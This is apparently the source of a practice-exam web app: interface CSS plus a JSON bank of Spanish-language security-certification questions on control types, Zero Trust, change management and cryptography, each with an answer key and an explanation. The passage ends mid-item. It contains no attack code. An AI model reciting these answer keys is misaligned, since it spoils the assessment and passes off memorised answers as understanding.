<style>
/* Layout: consola de examen — barra de estado fija arriba, una columna de lectura (~68ch) al centro, panel de navegación como hoja superpuesta. */
:root{
  --bg:#F3F5F8; --surface:#FFFFFF; --sunk:#E8ECF2; --line:#D3D9E3;
  --ink:#141B26; --ink-2:#4A5568; --ink-3:#77839A;

  --ok:#1C7A4A; --ok-soft:#DDF2E6; --bad:#B4232F; --bad-soft:#F9E0E2; --mid:#9A6B00; --mid-soft:#F7EDCF;
  --code-bg:#0F1724; --code-ink:#D7E0EE; --bar:#141B26; --bar-ink:#F3F5F8;
  --f-display:"Archivo","Arial Narrow",system-ui,sans-serif;
  --f-body:"IBM Plex Sans",system-ui,-apple-system,"Segoe UI",sans-serif;
  --f-mono:"IBM Plex Mono",ui-monospace,"SFMono-Regular",Menlo,Consolas,monospace;
  --r:10px;
}
@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){
  --bg:#0D1219; --surface:#151C26; --sunk:#1C2531; --line:#2A3544;
  --ink:#E6EBF2; --ink-2:#A9B4C4; --ink-3:#7E8AA0;
  --accent:#7D93FF; --accent-ink:#0B1020; --accent-soft:#1E2747;
  --flag:#F0B44C; --flag-soft:#3A2C12;
  --ok:#4CC88A; --ok-soft:#14301F; --bad:#FF7A84; --bad-soft:#3A1A1F; --mid:#E5C25A; --mid-soft:#34290F;
  --code-bg:#070B11; --code-ink:#D7E0EE; --bar:#05080D; --bar-ink:#E6EBF2; color-scheme:dark}}
:root[data-theme="dark"]{
  --bg:#0D1219; --surface:#151C26; --sunk:#1C2531; --line:#2A3544;
  --ink:#E6EBF2; --ink-2:#A9B4C4; --ink-3:#7E8AA0;
  --accent:#7D93FF; --accent-ink:#0B1020; --accent-soft:#1E2747;
  --flag:#F0B44C; --flag-soft:#3A2C12;
  --ok:#4CC88A; --ok-soft:#14301F; --bad:#FF7A84; --bad-soft:#3A1A1F; --mid:#E5C25A; --mid-soft:#34290F;
  --code-bg:#070B11; --code-ink:#D7E0EE; --bar:#05080D; --bar-ink:#E6EBF2; color-scheme:dark}
*{box-sizing:border-box}

.chip.ok{background:var(--ok-soft);color:var(--ok)} .chip.bad{background:var(--bad-soft);color:var(--bad)} .chip.mid{background:var(--mid-soft);color:var(--mid)} .chip.flag{background:var(--flag-soft);color:var(--flag)} .chip.acc{background:var(--accent-soft);color:var(--accent)}

/* ---------- Home ---------- */

.gauge .scale{position:relative;height:10px;border-radius:5px;background:linear-gradient(90deg,var(--bad-soft) 0 81.25%,var(--ok-soft) 81.25%);margin-top:10px}
.gauge .scale .mk{position:absolute;top:-4px;width:3px;height:18px;background:var(--ink);border-radius:2px;transform:translateX(-1px)}

.track i{position:absolute;inset:0 auto 0 0;border-radius:4px;background:var(--accent)}
.track i.ok{background:var(--ok)} .track i.mid{background:var(--mid)} .track i.bad{background:var(--bad)}
.track .tgt{position:absolute;top:-3px;bottom:-3px;left:81.25%;border-left:1px dashed var(--ink-3)}
.dbar .pct{font-family:var(--f-mono);font-variant-numeric:tabular-nums;text-align:right;font-weight:600}
@media (max-width:480px){.dbar{grid-template-columns:minmax(0,1fr) 48px}.dbar .chip{display:none}}
.modes{display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,280px),1fr));gap:14px}
.mode{display:flex;flex-direction:column;gap:10px;padding:16px;border:1px solid var(--line);border-radius:var(--r);background:var(--surface)}
.mode.hero{border-color:var(--ink);box-shadow:4px 4px 0 var(--ink)}
.mode .meta{font-family:var(--f-mono);font-size:.78rem;color:var(--ink-3)}
.mode .actions{display:flex;flex-wrap:wrap;gap:8px;margin-top:auto}
.examset{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:8px}
.examset button{flex-direction:column;align-items:flex-start;gap:2px;padding:10px 12px;white-space:nowrap}
.examset button small{font-family:var(--f-mono);font-weight:500;font-size:.72rem;color:var(--ink-3)}
.examset button.primary small{color:inherit;opacity:.8}
.field{display:flex;flex-direction:column;gap:4px;min-width:0}
.field label{font-size:.8rem;color:var(--ink-2);font-weight:500}
select,input[type=number]{font:inherit;font-size:.92rem;padding:8px 10px;border-radius:8px;border:1px solid var(--line);background:var(--surface);color:var(--ink);max-width:100%}
.resume{display:flex;flex-wrap:wrap;gap:12px;align-items:center;justify-content:space-between;padding:14px 16px;border-radius:var(--r);background:var(--flag-soft);border:1px solid var(--flag);margin-bottom:20px}
.weak{display:flex;flex-direction:column}
.weak .w{display:grid;grid-template-columns:52px minmax(0,1fr) auto;gap:12px;align-items:center;padding:10px 0;border-top:1px solid var(--line)}
.weak .w:first-child{border-top:0}
.weak .w .obj{font-family:var(--f-mono);font-weight:600;color:var(--ink-2)}
.weak .w .nm{font-size:.92rem;min-width:0}
.weak .w .nm small{display:block;color:var(--ink-3);font-family:var(--f-mono);font-size:.74rem}
.hist{width:100%;border-collapse:collapse;font-size:.9rem}

.progress{height:3px;background:rgba(127,127,127,.25)}

.opts{display:flex;flex-direction:column;gap:8px}

label.opt.locked{cursor:default}
label.opt .txt{padding-top:3px;min-width:0;overflow-wrap:anywhere}
.match{display:flex;flex-direction:column;gap:8px}
.mrow{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,240px);gap:12px;align-items:center;padding:10px 12px;border:1px solid var(--line);border-radius:var(--r);background:var(--surface)}
@media (max-width:560px){.mrow{grid-template-columns:1fr}}
.mrow .it{font-size:.95rem;min-width:0;overflow-wrap:anywhere}
.mrow select{width:100%}
.mrow.right{border-color:var(--ok);background:var(--ok-soft)} .mrow.wrong{border-color:var(--bad);background:var(--bad-soft)}
.mrow .fix{font-size:.82rem;color:var(--ok);font-weight:600;grid-column:1/-1}
.hint{font-size:.84rem;color:var(--ink-3);font-family:var(--f-mono)}
.explain{border-left:3px solid var(--accent);background:var(--surface);padding:14px 16px;border-radius:0 var(--r) var(--r) 0;font-size:.95rem;display:flex;flex-direction:column;gap:6px}
.explain.ok{border-color:var(--ok)} .explain.bad{border-color:var(--bad)}
.dock{position:fixed;left:0;right:0;bottom:0;z-index:5;background:var(--surface);border-top:1px solid var(--line);padding-bottom:env(safe-area-inset-bottom,0px)}
.dock .in{max-width:760px;margin:0 auto;padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));padding-block:12px;display:flex;gap:10px;align-items:center;justify-content:space-between;flex-wrap:wrap}
.kbd{font-family:var(--f-mono);font-size:.72rem;color:var(--ink-3)}
@media (max-width:560px){.kbd{display:none}}
/* Navigator sheet */
.sheet{position:fixed;inset:0;z-index:10;background:rgba(10,14,20,.55);display:flex;align-items:flex-start;justify-content:center;padding:max(24px,env(safe-area-inset-top,0px)) max(16px,env(safe-area-inset-right,0px)) 24px max(16px,env(safe-area-inset-left,0px));overflow:auto}
.sheet .box{background:var(--bg);border-radius:14px;max-width:760px;width:100%;padding:20px;display:flex;flex-direction:column;gap:16px;border:1px solid var(--line)}
.navgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(44px,1fr));gap:6px}
.navgrid button{justify-content:center;padding:8px 0;font-family:var(--f-mono);font-size:.82rem;position:relative}
.navgrid button.ans{background:var(--accent-soft);border-color:var(--accent);color:var(--accent)}

/* ---------- Results ---------- */
.verdict{display:grid;grid-template-columns:auto minmax(0,1fr);gap:22px;align-items:center;padding:22px;border-radius:var(--r);border:2px solid var(--ink);background:var(--surface)}

.tabs{display:flex;flex-wrap:wrap;gap:6px}
.tabs button.on{background:var(--ink);color:var(--bg);border-color:var(--ink)}
.rv{display:flex;flex-direction:column;gap:14px;padding:16px;border:1px solid var(--line);border-radius:var(--r);background:var(--surface)}

.rv .ua{font-size:.88rem}
@media (prefers-reduced-motion:reduce){*{transition:none!important;animation:none!important}}
</style>

<script id="bank" type="application/json">[{"id":"D1-001","domain":1,"objective":"1.1","type":"match","difficulty":2,"stem":"Un analista de seguridad está documentando los controles de la organización. Clasifica cada control según su TIPO de control.","items":["Un firewall perimetral que bloquea las conexiones entrantes no autorizadas","Un letrero en la cerca que advierte: \"Propiedad vigilada. Los intrusos serán procesados\"","Restaurar un servidor desde un backup limpio después de una infección de ransomware","Una regla de correlación del SIEM que genera una alerta ante múltiples inicios de sesión fallidos","Una política que indica a los empleados que deben cifrar los archivos antes de enviarlos a terceros","Colocar un WAF delante de una aplicación web vulnerable que no podrá corregirse hasta la próxima versión"],"choices":["Preventive","Deterrent","Detective","Corrective","Compensating","Directive"],"answer":[0,1,3,2,5,4],"explanation":"El firewall impide el acceso (preventive); el letrero desalienta al atacante sin impedirlo físicamente (deterrent); la restauración desde backup recupera el sistema tras el incidente (corrective); la alerta del SIEM identifica la actividad (detective). La política orienta el comportamiento de las personas (directive) y el WAF es una medida alternativa mientras no puede aplicarse el control principal, que es corregir el código (compensating)."},{"id":"D1-002","domain":1,"objective":"1.1","type":"single","difficulty":2,"stem":"Una empresa implementa un programa trimestral de concienciación en seguridad en el que los empleados practican cómo identificar y reportar correos de phishing. ¿En qué CATEGORÍA de control se clasifica MEJOR este programa?","options":["Technical","Managerial","Operational","Physical"],"answer":[2],"explanation":"Los controles operational los ejecutan principalmente personas en el día a día, como la capacitación y concienciación o los guardias de seguridad. Los managerial se enfocan en la gestión y gobierno (políticas, evaluaciones de riesgo), los technical se implementan con sistemas (firewalls, EDR) y los physical protegen instalaciones (cercas, cerraduras)."},{"id":"D1-003","domain":1,"objective":"1.1","type":"single","difficulty":1,"stem":"Un sistema SCADA legacy no admite los parches de seguridad más recientes del fabricante. Mientras se aprueba el presupuesto para reemplazarlo, el equipo de seguridad lo coloca en una VLAN aislada con ACLs estrictas. ¿Qué tipo de control se implementó?","options":["Corrective","Compensating","Deterrent","Directive"],"answer":[1],"explanation":"Un control compensating es una medida alternativa que reduce el riesgo cuando el control principal (en este caso, el parcheo) no puede aplicarse. No es corrective porque no repara un incidente, no es deterrent porque no busca desalentar al atacante y no es directive porque no es una instrucción o política."},{"id":"D1-004","domain":1,"objective":"1.1","type":"single","difficulty":2,"stem":"Cada lunes, un administrador revisa los logs de acceso del sistema de nómina para identificar inicios de sesión realizados fuera del horario laboral. ¿Qué tipo de control describe MEJOR esta actividad?","options":["Preventive","Corrective","Directive","Detective"],"answer":[3],"explanation":"La revisión de logs identifica actividad sospechosa después de que ocurre, por lo que es un control detective. No evita el acceso (preventive), no restaura el sistema (corrective) y no es una instrucción documentada para guiar el comportamiento (directive)."},{"id":"D1-005","domain":1,"objective":"1.1","type":"multi","difficulty":2,"stem":"Un equipo de seguridad instala un IPS en línea que inspecciona el tráfico y descarta automáticamente los paquetes que coinciden con firmas de exploits conocidos. ¿Qué DOS términos describen MEJOR este control? (Elige DOS.)","options":["Managerial","Technical","Deterrent","Physical","Preventive","Directive"],"answer":[1,4],"explanation":"El IPS es un control technical porque lo implementa un sistema, y es preventive porque bloquea el ataque antes de que tenga efecto. No es managerial ni physical por su naturaleza, no es deterrent porque no busca desalentar al atacante y no es directive porque no es una instrucción a personas."},{"id":"D1-006","domain":1,"objective":"1.1","type":"single","difficulty":3,"stem":"Durante una auditoría, se descubre que la organización aprobó una política que exige cifrar todos los portátiles corporativos, pero la herramienta de cifrado aún no se ha desplegado. ¿Qué combinación de categoría y tipo describe MEJOR el control que existe actualmente?","options":["Managerial / Directive","Technical / Preventive","Operational / Corrective","Managerial / Detective"],"answer":[0],"explanation":"Lo único que existe es la política: un documento de gobierno (categoría managerial) que indica qué se debe hacer (tipo directive). Technical / Preventive describiría el cifrado ya desplegado, que todavía no existe; la política no corrige incidentes ni detecta eventos."},{"id":"D1-007","domain":1,"objective":"1.2","type":"single","difficulty":1,"stem":"Un banco necesita asegurar que un cliente no pueda negar posteriormente que autorizó una transferencia electrónica. ¿Qué concepto de seguridad cubre MEJOR este requisito?","options":["Confidentiality","Availability","Non-repudiation","Authorization"],"answer":[2],"explanation":"Non-repudiation (no repudio) brinda prueba del origen y la integridad de una acción, normalmente mediante firmas digitales, de modo que el autor no pueda negarla. Confidentiality protege contra la divulgación, availability garantiza el acceso a los recursos y authorization define qué puede hacer un usuario autenticado."},{"id":"D1-008","domain":1,"objective":"1.2","type":"single","difficulty":3,"stem":"En una arquitectura Zero Trust, un usuario remoto solicita acceso a una aplicación interna. ¿Qué componente, ubicado en el data plane, intercepta la solicitud y permite, monitorea o termina la conexión según las instrucciones que recibe del control plane?","options":["Policy Engine","Policy Enforcement Point (PEP)","Policy Administrator","Implicit trust zone"],"answer":[1],"explanation":"El PEP está en el data plane y es el punto que hace cumplir la decisión: abre, supervisa o cierra la sesión entre el sujeto y el recurso. El Policy Engine toma la decisión y el Policy Administrator la comunica al PEP; ambos forman el Policy Decision Point en el control plane. La implicit trust zone es el área que queda detrás del PEP."},{"id":"D1-009","domain":1,"objective":"1.2","type":"multi","difficulty":3,"stem":"Un arquitecto está diseñando una solución Zero Trust y debe separar los componentes del control plane y del data plane. ¿Qué DOS componentes pertenecen al control plane? (Elige DOS.)","options":["Policy Engine","Policy Enforcement Point (PEP)","Implicit trust zones","Policy Administrator","Subject/System"],"answer":[0,3],"explanation":"El control plane incluye al Policy Engine (decide si se concede el acceso) y al Policy Administrator (establece o cierra la ruta de comunicación), además de adaptive identity, threat scope reduction y policy-driven access control. El PEP, las implicit trust zones y el subject/system pertenecen al data plane."},{"id":"D1-010","domain":1,"objective":"1.2","type":"single","difficulty":2,"stem":"Un empleado normalmente inicia sesión desde Guadalajara en horario laboral. Un día, su cuenta intenta autenticarse a las 3:00 a. m. desde otro país con un dispositivo no registrado, y el sistema, en función de ese contexto de riesgo, le exige un factor de autenticación adicional antes de permitirle continuar. ¿Qué concepto de Zero Trust se aplica?","options":["Adaptive identity","Threat scope reduction","Implicit trust zones","Gap analysis"],"answer":[0],"explanation":"Adaptive identity ajusta los requisitos de autenticación según el contexto y el riesgo (ubicación, hora, dispositivo, comportamiento). Threat scope reduction busca limitar el alcance de una posible brecha (por ejemplo, con least privilege), las implicit trust zones son áreas detrás del PEP y gap analysis compara el estado actual contra uno deseado."},{"id":"D1-011","domain":1,"objective":"1.2","type":"single","difficulty":1,"stem":"Una organización planea certificarse en ISO/IEC 27001 y quiere identificar qué requisitos de la norma aún no cumple su programa de seguridad actual. ¿Qué debe realizar PRIMERO?","options":["Penetration test","Business impact analysis (BIA)","Gap analysis","Tabletop exercise"],"answer":[2],"explanation":"Un gap analysis compara la situación actual contra un marco o estándar de referencia para identificar las brechas que deben cerrarse. El penetration test evalúa la explotabilidad técnica, el BIA mide el impacto de interrupciones en procesos del negocio y el tabletop exercise prueba planes de respuesta mediante discusión."},{"id":"D1-012","domain":1,"objective":"1.2","type":"match","difficulty":2,"stem":"El equipo de seguridad está desplegando tecnologías de deception (engaño). Relaciona cada implementación con el término correcto.","items":["Un documento llamado \"Nomina_Directivos.xlsx\" colocado en un recurso compartido, que genera una alerta cuando alguien lo abre","Un servidor configurado intencionalmente con un servicio SSH vulnerable para atraer y estudiar a los atacantes","Una clave de API falsa insertada en un repositorio de código que dispara una alerta si alguien intenta usarla","Un conjunto de servidores, estaciones de trabajo y switches señuelo interconectados que simulan un segmento de producción","Un registro de cliente ficticio en la base de datos del CRM; si su dirección de correo recibe mensajes, indica que hubo exfiltración"],"choices":["Honeypot","Honeynet","Honeyfile","Honeytoken"],"answer":[2,0,3,1,3],"explanation":"Un honeypot es un sistema individual señuelo y un honeynet es una red de varios honeypots. Un honeyfile es un archivo atractivo pero falso que alerta cuando se accede a él. Un honeytoken es un dato falso rastreable (credenciales, claves de API, registros) que revela el uso o la exfiltración de información."},{"id":"D1-013","domain":1,"objective":"1.2","type":"single","difficulty":1,"stem":"Un centro de datos detecta que personas no autorizadas entran caminando detrás de empleados que abren la puerta con su tarjeta (tailgating). ¿Qué control físico es la MEJOR solución?","options":["Bollards","Sensores de microondas","Cámaras de video (CCTV)","Access control vestibule"],"answer":[3],"explanation":"Un access control vestibule (antes llamado mantrap) usa dos puertas en las que solo una puede abrirse a la vez, lo que obliga a autenticar a cada persona y evita el tailgating. Los bollards protegen contra vehículos, los sensores de microondas detectan movimiento y el CCTV registra el evento, pero no lo impide."},{"id":"D1-014","domain":1,"objective":"1.2","type":"single","difficulty":1,"stem":"Después de que un usuario se autentica correctamente en la VPN, el servidor RADIUS registra la hora de conexión, la duración de la sesión y la cantidad de datos transferidos. ¿Qué componente de AAA representa este registro?","options":["Authentication","Accounting","Authorization","Non-repudiation"],"answer":[1],"explanation":"Accounting registra lo que hace el usuario y los recursos que consume (tiempos, datos, acciones) con fines de auditoría. Authentication verifica la identidad, authorization determina a qué recursos se tiene acceso y non-repudiation no forma parte del marco AAA."},{"id":"D1-015","domain":1,"objective":"1.3","type":"single","difficulty":1,"stem":"Durante una maintenance window, una actualización del ERP falla y la aplicación ya no inicia. El equipo necesita devolver el sistema a su estado anterior lo más rápido posible. ¿Qué elemento del proceso de change management debe consultar PRIMERO?","options":["Backout plan","Impact analysis","Test results","Lista de stakeholders"],"answer":[0],"explanation":"El backout plan documenta los pasos para revertir un cambio fallido y restaurar el estado anterior. El impact analysis y los test results se elaboran antes de aprobar el cambio, y la lista de stakeholders sirve para comunicar, no para recuperar el sistema."},{"id":"D1-016","domain":1,"objective":"1.3","type":"single","difficulty":2,"stem":"El gerente de Finanzas, cuyo equipo utiliza la aplicación que será modificada, debe ser consultado sobre el horario del cambio y notificado del resultado, aunque no ejecuta ni es responsable del cambio. ¿Qué rol desempeña en el proceso de change management?","options":["Owner del cambio","Change Advisory Board (CAB)","Administrador que implementa el cambio","Stakeholder"],"answer":[3],"explanation":"Los stakeholders son las personas o áreas afectadas por el cambio, cuyas necesidades deben considerarse y a quienes se debe informar. El owner es el responsable del cambio o del proceso que se modifica, el CAB evalúa y aprueba los cambios y el administrador es quien los ejecuta."},{"id":"D1-017","domain":1,"objective":"1.3","type":"multi","difficulty":2,"stem":"Un equipo planea actualizar la versión de Java en un servidor que aloja varias aplicaciones antiguas desarrolladas internamente; además, algunos servicios necesitan que otros arranquen antes que ellos. ¿Qué DOS implicaciones técnicas debe evaluar PRINCIPALMENTE el análisis de impacto? (Elige DOS.)","options":["Key escrow","Data masking","Legacy applications","Honeytokens","Dependencies"],"answer":[2,4],"explanation":"Las aplicaciones legacy pueden no ser compatibles con la nueva versión de Java, y las dependencies entre servicios pueden provocar fallas en cascada o requerir un orden específico de reinicio. Key escrow, data masking y honeytokens son conceptos reales del temario, pero no se relacionan con este cambio."},{"id":"D1-018","domain":1,"objective":"1.3","type":"single","difficulty":2,"stem":"Tras instalar un nuevo agente de backup en todos los servidores, el agente no se ejecuta porque la solución de application control lo bloquea. ¿Qué debió considerarse en el plan del cambio para evitar este problema?","options":["Programar un restart adicional del servicio","Ampliar la maintenance window","Actualizar la allow list de aplicaciones","Actualizar los diagramas de red"],"answer":[2],"explanation":"Cuando el control de aplicaciones funciona con allow list, cualquier software nuevo debe agregarse a la lista como parte del cambio; de lo contrario, se bloquea. Reiniciar el servicio o ampliar la ventana no cambia la política de bloqueo, y actualizar los diagramas es buena práctica de documentación, pero no resuelve la ejecución."},{"id":"D1-019","domain":1,"objective":"1.3","type":"single","difficulty":3,"stem":"El CAB aprueba un cambio para renovar el certificado TLS de un balanceador de carga durante la maintenance window del sábado. Durante la implementación, el técnico nota que también hay un parche pendiente del sistema operativo del balanceador. ¿Qué debe hacer el técnico?","options":["Aplicar el parche, ya que la maintenance window sigue abierta","Implementar solo el cambio aprobado y registrar una nueva solicitud de cambio para el parche","Aplicar el parche y documentarlo después en el ticket original","Aplicar el parche solo si existe un backout plan para el certificado"],"answer":[1],"explanation":"El alcance de un cambio aprobado está limitado a lo autorizado (restricted activities); cualquier actividad adicional requiere su propio análisis de impacto, pruebas y aprobación. Aprovechar la ventana o documentar después evade el proceso, y el backout plan del certificado no cubre los riesgos del parche."},{"id":"D1-020","domain":1,"objective":"1.3","type":"match","difficulty":2,"stem":"Relaciona cada descripción con el elemento del proceso de change management que le corresponde.","items":["Evaluación de los riesgos y efectos que el cambio tendrá en sistemas, usuarios y procesos","Pasos documentados para revertir el sistema a su estado anterior si el cambio falla","Instrucciones paso a paso estandarizadas para realizar de forma consistente un tipo de cambio recurrente","Periodo programado, de baja actividad del negocio, en el que se permite implementar cambios","Registro de cada modificación a los archivos de configuración, con autor y fecha, que permite regresar a versiones anteriores","Evidencia de que el cambio funcionó correctamente en un entorno de staging antes de llevarlo a producción"],"choices":["Backout plan","Maintenance window","Test results","Impact analysis","Version control","Standard operating procedure (SOP)"],"answer":[3,0,5,1,4,2],"explanation":"El impact analysis evalúa riesgos y efectos; el backout plan define cómo revertir; el SOP estandariza la ejecución de tareas recurrentes; la maintenance window fija cuándo se puede implementar; el version control rastrea las modificaciones y permite regresar a versiones anteriores, y los test results demuestran que el cambio se validó antes de producción."},{"id":"D1-021","domain":1,"objective":"1.3","type":"single","difficulty":1,"stem":"Se completó con éxito un cambio que agregó un nuevo segmento de red y modificó las reglas del firewall. El ticket de cambio ya se cerró. ¿Qué debe hacer el equipo a continuación para cumplir con las buenas prácticas de change management?","options":["Programar un penetration test externo","Ejecutar el backout plan para validar que funciona","Actualizar los diagramas de red y la documentación de políticas y procedimientos afectados","Reiniciar todos los servidores del nuevo segmento"],"answer":[2],"explanation":"Después de un cambio, la documentación (diagramas, políticas, procedimientos) debe actualizarse para reflejar el estado real del entorno; de lo contrario, las siguientes decisiones se basarán en información obsoleta. Ejecutar el backout plan revertiría un cambio exitoso, y ni el penetration test ni los reinicios forman parte del cierre del cambio."},{"id":"D1-022","domain":1,"objective":"1.4","type":"single","difficulty":1,"stem":"Una empresa necesita cifrar varios terabytes de backups cada noche con el menor impacto posible en el rendimiento. ¿Qué algoritmo es la MEJOR opción?","options":["RSA-4096","SHA-512","ECDSA","AES-256"],"answer":[3],"explanation":"AES es un algoritmo simétrico, mucho más rápido que el cifrado asimétrico y adecuado para grandes volúmenes de datos (bulk encryption). RSA es asimétrico y lento para grandes volúmenes, SHA-512 es un hash (no cifra ni permite recuperar los datos) y ECDSA es un algoritmo de firma digital."},{"id":"D1-023","domain":1,"objective":"1.4","type":"match","difficulty":2,"stem":"Un auditor revisa el inventario criptográfico de una aplicación. Clasifica cada algoritmo en la categoría correcta.","items":["RSA","AES-256","SHA-256","3DES","ECC","MD5"],"choices":["Cifrado simétrico","Cifrado asimétrico","Hashing"],"answer":[1,0,2,0,1,2],"explanation":"AES y 3DES son simétricos: usan la misma clave para cifrar y descifrar. RSA y ECC son asimétricos: usan un par de claves pública/privada. SHA-256 y MD5 son funciones de hashing de un solo sentido; MD5 se considera obsoleto por sus colisiones."},{"id":"D1-024","domain":1,"objective":"1.4","type":"multi","difficulty":3,"stem":"Un usuario envía un correo con S/MIME que va firmado digitalmente y cifrado para que solo el destinatario pueda leerlo. ¿Qué DOS claves utiliza el REMITENTE en este proceso? (Elige DOS.)","options":["Clave pública del remitente","Clave privada del remitente","Clave privada del destinatario","Clave pública del destinatario","Clave privada de la CA"],"answer":[1,3],"explanation":"El remitente firma con su clave privada (autenticidad, integridad y non-repudiation) y cifra con la clave pública del destinatario (en la práctica, cifra con ella la clave de sesión simétrica), de modo que solo la clave privada del destinatario permita descifrar. El remitente nunca tiene la clave privada del destinatario, y la clave privada de la CA solo se usa para firmar certificados."},{"id":"D1-025","domain":1,"objective":"1.4","type":"single","difficulty":3,"stem":"Un arquitecto configura TLS en un servidor web y exige que, si la clave privada del servidor se ve comprometida en el futuro, el tráfico de sesiones previas que haya sido capturado no pueda descifrarse. ¿Qué debe priorizar en la configuración de las cipher suites?","options":["Aumentar el algoritmo de hashing a SHA-512","Intercambio de claves con RSA (key transport)","Intercambio de claves con Diffie-Hellman efímero (ECDHE)","Un certificado wildcard emitido por una CA third-party"],"answer":[2],"explanation":"El intercambio de claves con Diffie-Hellman efímero (DHE/ECDHE) genera claves de sesión únicas que no dependen de la clave privada del servidor, lo que proporciona perfect forward secrecy. Con RSA key transport, quien obtenga la clave privada puede descifrar las sesiones capturadas; el hash y el tipo de certificado no influyen en esto."},{"id":"D1-026","domain":1,"objective":"1.4","type":"single","difficulty":2,"stem":"Un atacante obtuvo una copia de la base de datos de hashes de contraseñas de una aplicación web y planea usar rainbow tables precalculadas. ¿Qué medida habría sido la MEJOR para inutilizar este tipo de ataque?","options":["Key escrow","Salting","Tokenization","Aumentar la longitud de la clave AES de 128 a 256 bits"],"answer":[1],"explanation":"El salting agrega un valor aleatorio único a cada contraseña antes del hashing, por lo que contraseñas iguales producen hashes distintos y las rainbow tables precalculadas dejan de servir. Key escrow almacena claves con un tercero, tokenization sustituye datos sensibles y la longitud de la clave AES no se relaciona con hashes de contraseñas."},{"id":"D1-027","domain":1,"objective":"1.4","type":"multi","difficulty":2,"stem":"Un desarrollador necesita almacenar las contraseñas de los usuarios de manera que los ataques de fuerza bruta offline sean computacionalmente costosos, mediante múltiples iteraciones de hashing. ¿Qué DOS algoritmos implementan key stretching? (Elige DOS.)","options":["PBKDF2","SHA-256","bcrypt","AES-128","MD5","RSA"],"answer":[0,2],"explanation":"PBKDF2 y bcrypt son funciones de key stretching: aplican el hash miles de veces con salt para que cada intento de adivinanza sea lento. SHA-256 y MD5 son hashes rápidos de una sola pasada (MD5 además es inseguro), AES-128 es cifrado simétrico y RSA es cifrado asimétrico."},{"id":"D1-028","domain":1,"objective":"1.4","type":"single","difficulty":2,"stem":"Un comercio en línea quiere reducir su alcance de PCI DSS reemplazando el número de tarjeta (PAN) en sus sistemas por un valor aleatorio sin relación matemática con el original. El PAN real se almacenará en un vault separado y protegido. ¿Qué técnica cumple MEJOR este requisito?","options":["Data masking","Hashing","Steganography","Tokenization"],"answer":[3],"explanation":"Tokenization sustituye el dato sensible por un token sin relación matemática con el original y guarda el mapeo en un token vault, lo que permite recuperar el valor real cuando se necesita. Data masking oculta parte del dato (por ejemplo, los últimos 4 dígitos), el hashing no permite recuperar el PAN y la steganography oculta datos dentro de otros archivos."},{"id":"D1-029","domain":1,"objective":"1.4","type":"single","difficulty":1,"stem":"Una herramienta DLP detecta que un empleado envía por correo personal fotografías de paisajes cuyo tamaño de archivo es inusualmente grande. El análisis forense revela que dentro de las imágenes hay documentos confidenciales ocultos. ¿Qué técnica utilizó el empleado?","options":["Steganography","Tokenization","Data masking","Key stretching"],"answer":[0],"explanation":"La steganography oculta información dentro de otro archivo portador, como imágenes, audio o video, para que su existencia pase desapercibida. Tokenization y data masking protegen datos sensibles dentro de sistemas legítimos, y key stretching fortalece contraseñas."},{"id":"D1-030","domain":1,"objective":"1.4","type":"single","difficulty":3,"stem":"Una organización implementa una CA raíz on-premises y necesita un dispositivo de hardware dedicado, resistente a manipulación (tamper-resistant), con certificación FIPS 140-2 nivel 3 y aceleración criptográfica, para generar y almacenar la clave privada de la CA y realizar las operaciones de firma. ¿Qué solución es la MEJOR?","options":["TPM","Secure enclave","HSM","KMS del proveedor de nube"],"answer":[2],"explanation":"Un HSM (Hardware Security Module) es un dispositivo dedicado, tamper-resistant y de alto rendimiento para generar, almacenar y usar claves críticas, como las de una CA. El TPM y el secure enclave están integrados en un equipo o procesador específico para proteger claves locales, y un KMS en la nube no cumple el requisito de hardware dedicado on-premises."},{"id":"D1-031","domain":1,"objective":"1.4","type":"single","difficulty":3,"stem":"Una empresa despliega full-disk encryption en sus portátiles y quiere que la clave de cifrado quede ligada al hardware del equipo y solo se libere si las mediciones del proceso de arranque (measured boot) no han cambiado. ¿Qué componente proporciona MEJOR esta capacidad?","options":["HSM","TPM","KMS","Key escrow"],"answer":[1],"explanation":"El TPM es un chip en la placa base que almacena claves de forma segura y guarda mediciones del arranque en registros PCR; libera la clave de cifrado (por ejemplo, para BitLocker) solo si la integridad del arranque se mantiene. Un HSM es un dispositivo dedicado para servidores o CA, un KMS gestiona claves de forma centralizada y key escrow es un acuerdo de custodia de claves, no un componente de hardware."},{"id":"D1-032","domain":1,"objective":"1.4","type":"single","difficulty":2,"stem":"Un navegador necesita comprobar en tiempo real si el certificado de un sitio web fue revocado, sin descargar la lista completa de certificados revocados de la CA. ¿Qué mecanismo debe utilizar?","options":["CRL","Root of trust","CSR","OCSP"],"answer":[3],"explanation":"OCSP (Online Certificate Status Protocol) consulta el estado de un certificado individual en tiempo real; con OCSP stapling, el propio servidor entrega la respuesta firmada. Una CRL obliga a descargar toda la lista de revocados, el root of trust es el ancla de confianza de la cadena y el CSR es la solicitud para obtener un certificado."},{"id":"D1-033","domain":1,"objective":"1.4","type":"single","difficulty":3,"stem":"Una empresa aloja decenas de subdominios de example.com (portal.example.com, api.example.com, tienda.example.com) y crea nuevos subdominios cada mes. Quiere que los navegadores públicos confíen en todos ellos y minimizar la administración de certificados. ¿Qué opción es la MEJOR?","options":["Un certificado wildcard (*.example.com) emitido por una CA third-party","Un certificado con SAN que liste los subdominios actuales","Certificados self-signed para cada subdominio","Un certificado emitido directamente por la root CA interna para cada servidor"],"answer":[0],"explanation":"Un certificado wildcard de una CA third-party de confianza cubre todos los subdominios de un nivel, incluidos los que se creen en el futuro, sin necesidad de reemitirlo. Un certificado con SAN tendría que reemitirse cada vez que se agregue un subdominio, y los certificados self-signed o de una CA interna no son de confianza para los navegadores públicos."},{"id":"D1-034","domain":1,"objective":"1.4","type":"single","difficulty":1,"stem":"A un ejecutivo le robaron su portátil en un aeropuerto. La empresa quiere asegurar que, en futuros incidentes similares, ningún dato del equipo (incluidos el sistema operativo, los archivos temporales y el archivo de paginación) pueda leerse al extraer el disco. ¿Qué nivel de cifrado debe implementar?","options":["File-level encryption","Full-disk encryption","Database encryption","Transport encryption (TLS)"],"answer":[1],"explanation":"Full-disk encryption cifra todo el contenido del disco, incluidos el sistema operativo, los archivos temporales y el swap, lo que protege los datos en reposo si se pierde el equipo. File-level solo protege los archivos seleccionados, database encryption solo protege la base de datos y TLS protege datos en tránsito, no en 